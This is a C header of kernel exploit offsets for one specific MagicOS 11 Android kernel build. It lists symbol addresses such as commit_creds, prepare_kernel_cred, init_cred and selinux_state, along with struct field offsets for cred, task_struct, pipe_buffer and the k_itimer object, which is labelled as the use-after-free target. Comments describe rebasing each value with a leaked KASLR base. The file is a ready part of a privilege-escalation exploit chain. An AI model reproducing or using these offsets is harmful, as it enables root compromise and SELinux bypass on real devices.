/* magicOS11-98260 适配偏移头（MEY 11.0.0.109 SP8, 6.6.118-g554929766a0d-abogki544555896）
 * 来源：kernel_11.elf（vmlinux-to-elf 恢复，111,074 符号）+ vmlinux.btf（设备 BTF 解析）
 * 地址均为 _text=0xffffffc080000000 基址下的镜像地址；KASLR 运行时补 slide。
 * ⚠ 每个数值需在目标 boot 上用泄漏的 KASLR base 做 地址 = base + (sym - _text) 换算。 */
#ifndef OFFSETS_MAGICOS11_H
#define OFFSETS_MAGICOS11_H

#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL

/* ---- 符号偏移（sym - KIMAGE_TEXT_BASE） ---- */
#define OFF_INIT_TASK                    0x0217e280ULL
#define OFF_INIT_CRED                    0x02190790ULL
#define OFF_INIT_NSPROXY                 0x021903c0ULL
#define OFF_INIT_PID_NS                  0x02190238ULL
#define OFF_COMMIT_CREDS                 0x002388e0ULL
#define OFF_PREPARE_KERNEL_CRED          0x00936e68ULL
#define OFF_OVERRIDE_CREDS               0x00238bacULL
#define OFF_SELINUX_STATE                0x023ba418ULL
#define OFF_KMALLOC_CACHES               0x01699f58ULL
#define OFF_KMEM_CACHE_ALLOC             0x001955b4ULL
#define OFF_KFREE                        0x0005a8c8ULL
#define OFF_POSIX_TIMERS_CACHE           0x0239c7a0ULL
#define OFF_POSIX_CPU_TIMER_DEL          0x008851bcULL
#define OFF_POSIX_TIMER_UNHASH_AND_FREE  0x0062f8b4ULL
#define OFF_TIMERQUEUE_ADD               0x0003f724ULL
#define OFF_TIMERQUEUE_DEL               0x0003f7d8ULL
#define OFF_FIND_TASK_BY_VPID            0x0007e1d4ULL
#define OFF___PER_CPU_OFFSET             0x0216b658ULL
#define OFF_ANON_PIPE_BUF_OPS            0x01184208ULL
#define OFF_ALLOC_PIPE_INFO              0x0035d180ULL
#define OFF_PIPE_WRITE                   0x0035dbb0ULL

/* ---- 结构体偏移（BTF 实测） ---- */
/* task_struct (0x12c0) */
#define TASK_REAL_CRED_OFF            0x818
#define TASK_CRED_OFF                 0x820
#define TASK_COMM_OFF                 0x830
#define TASK_PID_OFF                  0x618
#define TASK_TGID_OFF                 0x61c
#define TASK_TASKS_OFF                0x550
#define TASK_MM_OFF                   0x5a0
#define TASK_NSPROXY_OFF              0x870
#define TASK_POSIX_CPUTIMERS_OFF      0x778
/* cred (0xb8) */
#define CRED_UID_OFF                  0x8
#define CRED_GID_OFF                  0xc
#define CRED_EUID_OFF                 0x18
#define CRED_EGID_OFF                 0x1c
#define CRED_FSUID_OFF                0x20
#define CRED_FSGID_OFF                0x24
#define CRED_CAP_PERMITTED_OFF        0x38
#define CRED_CAP_EFFECTIVE_OFF        0x40
#define CRED_SECURITY_OFF             0x80
#define CRED_USER_NS_OFF              0x90
/* k_itimer (0x108) —— 98260 UAF 对象 */
#define KITIMER_LIST_OFF              0x0
#define KITIMER_IT_CLOCK_OFF          0x30
#define KITIMER_IT_ID_OFF             0x34
#define KITIMER_IT_IRQ_OFF            0x38
#define KITIMER_IT_INTERVAL_OFF       0x58
#define KITIMER_IT_SIGNAL_OFF         0x60
#define KITIMER_SIGQ_OFF              0x70
#define KITIMER_IT_OFF                0x78
#define KITIMER_RCU_OFF               0xf8
/* cpu_timer (0x50) —— k_itimer+0x78 */
#define CPUTIMER_NODE_OFF             0x0
#define CPUTIMER_HEAD_OFF             0x20
#define CPUTIMER_PID_OFF              0x28
#define CPUTIMER_ELIST_OFF            0x30
/* timerqueue_node (0x20) */
#define TQ_NODE_OFF                   0x0
#define TQ_EXPIRES_OFF                0x18
/* posix_cputimers (0x50, task_struct+0x778) */
#define PCT_BASES_OFF                 0x0
#define PCT_TIMERS_ACTIVE_OFF         0x48
/* pipe_buffer (0x28) */
#define PIPE_BUF_PAGE_OFF             0x0
#define PIPE_BUF_OFFSET_OFF           0x8
#define PIPE_BUF_LEN_OFF              0xc
#define PIPE_BUF_OPS_OFF              0x10
/* selinux_state (0x80) */
#define SELINUX_ENFORCING_OFF         0x0
/* file_operations (0x108) */
#define FOPS_IOCTL_OFF                0x48
#define FOPS_OPEN_OFF                 0x68
#define FOPS_RELEASE_OFF              0x78

#endif /* OFFSETS_MAGICOS11_H */
